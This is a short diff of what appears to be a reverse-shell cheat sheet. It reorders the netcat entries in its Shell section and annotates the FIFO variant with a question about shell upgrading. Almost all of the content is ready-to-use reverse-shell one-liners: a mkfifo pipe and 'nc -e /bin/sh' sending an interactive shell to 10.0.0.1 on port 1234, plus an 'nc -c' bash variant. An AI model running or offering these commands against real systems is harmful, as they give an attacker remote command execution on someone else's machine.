@@ -4,11 +4,6 @@
 
 ### Shell
 
-Using FIFO
-
-```
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
-```
 
 ```
 nc -c '/bin/bash -c "script /dev/null"' 127.0.0.1 1337
@@ -16,6 +11,12 @@ nc -c '/bin/bash -c "script /dev/null"' 127.0.0.1 1337
 
 ```
 nc -e /bin/sh 10.0.0.1 1234
+```
+
+Using FIFO (Doesn't work with upgrading?)
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
 
 ### Python
